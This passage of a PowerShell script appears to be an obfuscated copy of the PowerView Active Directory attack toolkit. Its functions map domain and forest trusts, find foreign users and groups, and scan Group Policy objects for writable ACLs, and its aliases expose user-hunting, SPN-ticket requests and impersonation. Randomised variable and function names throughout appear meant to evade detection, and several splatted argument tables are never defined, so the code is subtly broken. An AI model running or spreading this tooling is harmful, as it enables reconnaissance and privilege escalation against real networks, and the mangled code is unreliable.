                    $LIdFeKYN99 += $vkFCmlnO99
                    $BqvbElhB99 = ''
                    $rKtGlbHQ99 = $kLxjtaqc99::ConvertSidToStringSid($Info.DomainSid, [ref]$BqvbElhB99);$ZIbFJfXa99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($rKtGlbHQ99 -eq 0) {
                        Write-Verbose "[accustoms] Error: $(([ComponentModel.Win32Exception] $ZIbFJfXa99).Message)"
                    }
                    else {
                        $iKRJtUbd99 = New-Object PSObject
                        $iKRJtUbd99 | Add-Member Noteproperty 'SourceName' $HRYZEsuR99
                        $iKRJtUbd99 | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $iKRJtUbd99 | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $iKRJtUbd99 | Add-Member Noteproperty 'Flags' $Info.Flags
                        $iKRJtUbd99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $iKRJtUbd99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $iKRJtUbd99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $iKRJtUbd99 | Add-Member Noteproperty 'TargetSid' $BqvbElhB99
                        $iKRJtUbd99 | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $iKRJtUbd99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $iKRJtUbd99
                    }
                }
                $Null = $CBPFTmxs99::NetApiBufferFree($HOChRdeK99)
            }
            else {
                Write-Verbose "[accustoms] Error: $(([ComponentModel.Win32Exception] $rKtGlbHQ99).Message)"
            }
        }
        else {
            $WiwtkvNl99 = Md @NetSearcherArguments
            if ($WiwtkvNl99) {
                $WiwtkvNl99.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}
function cowhands {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UpdiKnQa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $QjFQIMaw99 = @{}
        if ($PSBoundParameters['Forest']) { $QjFQIMaw99['Forest'] = $UpdiKnQa99 }
        if ($PSBoundParameters['Credential']) { $QjFQIMaw99['Credential'] = $DegNROrc99 }
        $kTLeaHDv99 = songsters @NetForestArguments
        if ($kTLeaHDv99) {
            $kTLeaHDv99.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}
function matchbooks {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cODXoeui99 = @{}
        $cODXoeui99['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['Raw']) { $cODXoeui99['Raw'] = $Raw }
    }
    PROCESS {
        Lille @SearcherArguments  | ForEach-Object {
            ForEach ($cfWdHbFk99 in $_.memberof) {
                $Index = $cfWdHbFk99.IndexOf('DC=')
                if ($Index) {
                    $MVJzoRlG99 = $($cfWdHbFk99.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $RkIsLFuO99 = $_.distinguishedname
                    $PSNHEqyK99 = $RkIsLFuO99.IndexOf('DC=')
                    $GOrSdVAL99 = $($_.distinguishedname.SubString($PSNHEqyK99)) -replace 'DC=','' -replace ',','.'
                    if ($MVJzoRlG99 -ne $GOrSdVAL99) {
                        $nrOpsRrf99 = $cfWdHbFk99.Split(',')[0].split('=')[1]
                        $ysVMnGPo99 = New-Object PSObject
                        $ysVMnGPo99 | Add-Member Noteproperty 'UserDomain' $GOrSdVAL99
                        $ysVMnGPo99 | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $ysVMnGPo99 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $ysVMnGPo99 | Add-Member Noteproperty 'GroupDomain' $MVJzoRlG99
                        $ysVMnGPo99 | Add-Member Noteproperty 'GroupName' $nrOpsRrf99
                        $ysVMnGPo99 | Add-Member Noteproperty 'GroupDistinguishedName' $cfWdHbFk99
                        $ysVMnGPo99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $ysVMnGPo99
                    }
                }
            }
        }
    }
}
function snuffers {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cODXoeui99 = @{}
        $cODXoeui99['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['Raw']) { $cODXoeui99['Raw'] = $Raw }
    }
    PROCESS {
        $iCTQUOwQ99 = @('Users', 'Domain Users', 'Guests')
        ledger @SearcherArguments | Where-Object { $iCTQUOwQ99 -notcontains $_.samaccountname } | ForEach-Object {
            $nrOpsRrf99 = $_.samAccountName
            $VJQFZPGG99 = $_.distinguishedname
            $MVJzoRlG99 = $VJQFZPGG99.SubString($VJQFZPGG99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
            $_.member | ForEach-Object {
                $KeJeUFmP99 = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($MVJzoRlG99 -ne $KeJeUFmP99)) {
                    $RySQaKcF99 = $_
                    $vedlGvLL99 = $_.Split(',')[0].split('=')[1]
                    $AavrnluL99 = New-Object PSObject
                    $AavrnluL99 | Add-Member Noteproperty 'GroupDomain' $MVJzoRlG99
                    $AavrnluL99 | Add-Member Noteproperty 'GroupName' $nrOpsRrf99
                    $AavrnluL99 | Add-Member Noteproperty 'GroupDistinguishedName' $VJQFZPGG99
                    $AavrnluL99 | Add-Member Noteproperty 'MemberDomain' $KeJeUFmP99
                    $AavrnluL99 | Add-Member Noteproperty 'MemberName' $vedlGvLL99
                    $AavrnluL99 | Add-Member Noteproperty 'MemberDistinguishedName' $RySQaKcF99
                    $AavrnluL99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $AavrnluL99
                }
            }
        }
    }
}
function bounties {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $YXMSPUCr99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    $QtlEftYz99 = @{}
    $OHFUqQil99 = New-Object System.Collections.Stack
    $LvDSXjBy99 = @{}
    if ($PSBoundParameters['API']) { $LvDSXjBy99['API'] = $API }
    if ($PSBoundParameters['NET']) { $LvDSXjBy99['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $LvDSXjBy99['LDAPFilter'] = $YcLdsqIq99 }
    if ($PSBoundParameters['Properties']) { $LvDSXjBy99['Properties'] = $pwEfoKvn99 }
    if ($PSBoundParameters['SearchBase']) { $LvDSXjBy99['SearchBase'] = $sVFAWYQs99 }
    if ($PSBoundParameters['Server']) { $LvDSXjBy99['Server'] = $sWbqYnBA99 }
    if ($PSBoundParameters['SearchScope']) { $LvDSXjBy99['SearchScope'] = $hZznjEbB99 }
    if ($PSBoundParameters['ResultPageSize']) { $LvDSXjBy99['ResultPageSize'] = $jrZpVEwq99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $LvDSXjBy99['ServerTimeLimit'] = $kkbrymyp99 }
    if ($PSBoundParameters['Tombstone']) { $LvDSXjBy99['Tombstone'] = $YXMSPUCr99 }
    if ($PSBoundParameters['Credential']) { $LvDSXjBy99['Credential'] = $DegNROrc99 }
    if ($PSBoundParameters['Credential']) {
        $WxKwuyHR99 = (Md -DegNROrc99 $DegNROrc99).Name
    }
    else {
        $WxKwuyHR99 = (Md).Name
    }
    $OHFUqQil99.Push($WxKwuyHR99)
    while($OHFUqQil99.Count -ne 0) {
        $StsWGohF99 = $OHFUqQil99.Pop()
        if ($StsWGohF99 -and ($StsWGohF99.Trim() -ne '') -and (-not $QtlEftYz99.ContainsKey($StsWGohF99))) {
            Write-Verbose "[bounties] Enumerating trusts for domain: '$StsWGohF99'"
            $Null = $QtlEftYz99.Add($StsWGohF99, '')
            try {
                $LvDSXjBy99['Domain'] = $StsWGohF99
                $HKQGAFqx99 = accustoms @DomainTrustArguments
                if ($HKQGAFqx99 -isnot [System.Array]) {
                    $HKQGAFqx99 = @($HKQGAFqx99)
                }
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $bKQTcPfa99 = @{}
                    if ($PSBoundParameters['Forest']) { $bKQTcPfa99['Forest'] = $UpdiKnQa99 }
                    if ($PSBoundParameters['Credential']) { $bKQTcPfa99['Credential'] = $DegNROrc99 }
                    $HKQGAFqx99 += cowhands @ForestTrustArguments
                }
                if ($HKQGAFqx99) {
                    if ($HKQGAFqx99 -isnot [System.Array]) {
                        $HKQGAFqx99 = @($HKQGAFqx99)
                    }
                    ForEach ($Trust in $HKQGAFqx99) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $OHFUqQil99.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[bounties] Error: $_"
            }
        }
    }
}
function irretrievable {
    [CmdletBinding()]
    Param (
        [String]
        $DiJmTVfg99 = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $WJMKXbgU99 = 200
    )
    $KUyIAMJU99 = @('SYSTEM','Domain Admins','Enterprise Admins')
    $UpdiKnQa99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $nCoxVkEJ99 = @($UpdiKnQa99.Domains)
    $OHFUqQil99 = $nCoxVkEJ99 | foreach { $_.GetDirectoryEntry() }
    foreach ($StsWGohF99 in $OHFUqQil99) {
        $ypcTqVPU99 = "(&(objectCategory=groupPolicyContainer)(displayname=$DiJmTVfg99))"
        $MWKeDdKg99 = New-Object System.DirectoryServices.DirectorySearcher
        $MWKeDdKg99.SearchRoot = $StsWGohF99
        $MWKeDdKg99.Filter = $ypcTqVPU99
        $MWKeDdKg99.PageSize = $WJMKXbgU99
        $MWKeDdKg99.SearchScope = "Subtree"
        $guppLAUK99 = $MWKeDdKg99.FindAll()
        foreach ($gpo in $guppLAUK99){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $KUyIAMJU99 -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $YeSIoMxU99 = New-Object psobject
            $YeSIoMxU99 | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $YeSIoMxU99 | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $YeSIoMxU99 | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $YeSIoMxU99 | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $YeSIoMxU99
        }
        }
    }
}
$Mod = compunctions -ModuleName Win32
$qIGCLzdc99 = Miller $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}
$hlaZBoOG99 = Miller $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield
$uxoaxGDG99 = Miller $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield
$LcPfzkwY99 = Miller $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$MqEpWIAA99 = leadership $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $LcPfzkwY99
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}
$MLeUUkBc99 = leadership $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}
$tQSzneeQ99 = leadership $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}
$NlJPyjwf99 = leadership $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}
$shbhirre99 = leadership $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}
$MunCqGMV99 = Miller $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
$obwoAMbm99 = leadership $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}
$rvNRlxzE99 = leadership $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $MunCqGMV99
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}
$DsDomainFlag = Miller $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$QetXwjVy99 = Miller $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$HYpNxRHS99 = Miller $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
$ewJilPDX99 = leadership $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $QetXwjVy99
    TrustAttributes = field 5 $HYpNxRHS99
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}
$aGcPcKVm99 = leadership $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($aGcPcKVm99, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$Types = $FunctionDefinitions | imprisons -Module $Mod -Namespace 'Win32'
$CBPFTmxs99 = $Types['netapi32']
$kLxjtaqc99 = $Types['advapi32']
$Slnejkwp99 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']
Set-Alias Get-IPAddress Mg
Set-Alias Convert-NameToSid peter
Set-Alias Convert-SidToName chews
Set-Alias Request-SPNTicket shortens
Set-Alias Get-DNSZone salvages
Set-Alias Get-DNSRecord dwarfish
Set-Alias Get-NetDomain Md
Set-Alias Get-NetDomainController skyrockets
Set-Alias Get-NetForest songsters
Set-Alias Get-NetForestDomain halos
Set-Alias Get-NetForestCatalog archeology
Set-Alias Get-NetUser Lille
Set-Alias Get-UserEvent quartette
Set-Alias Get-NetComputer snivel
Set-Alias Get-ADObject structuring
Set-Alias Set-ADObject tonal
Set-Alias Get-ObjectAcl capsized
Set-Alias Add-ObjectAcl artless
Set-Alias Invoke-ACLScanner remounted
Set-Alias Get-GUIDMap puberty
Set-Alias Get-NetOU newspaperwomen
Set-Alias Get-NetSite linguists
Set-Alias Get-NetSubnet Cepheid
Set-Alias Get-NetGroup ledger
Set-Alias Find-ManagedSecurityGroups emblazoning
Set-Alias Get-NetGroupMember Zaporozhye
Set-Alias Get-NetFileServer perhaps
Set-Alias Get-DFSshare debonair
Set-Alias Get-NetGPO outskirts
Set-Alias Get-NetGPOGroup products
Set-Alias Find-GPOLocation zebus
Set-Alias Find-GPOComputerAdmin importer
Set-Alias Get-LoggedOnLocal midges
Set-Alias Invoke-CheckLocalAdminAccess runarounds
Set-Alias Get-SiteName benevolences
Set-Alias Get-Proxy syllogism
Set-Alias Get-LastLoggedOn sorrowing
Set-Alias Get-CachedRDPConnection mousers
Set-Alias Get-RegistryMountedDrive posited
Set-Alias Get-NetProcess scullions
Set-Alias Invoke-ThreadedFunction spaced
Set-Alias Invoke-UserHunter steady
Set-Alias Invoke-ProcessHunter apprehending
Set-Alias Invoke-EventHunter tracheotomies
Set-Alias Invoke-ShareFinder nourishing
Set-Alias Invoke-FileFinder misdiagnosis
Set-Alias Invoke-EnumerateLocalAdmin forming
Set-Alias Get-NetDomainTrust accustoms
Set-Alias Get-NetForestTrust cowhands
Set-Alias Find-ForeignUser matchbooks
Set-Alias Find-ForeignGroup snuffers
Set-Alias Invoke-MapDomainTrust bounties
Set-Alias Get-DomainPolicy slosh
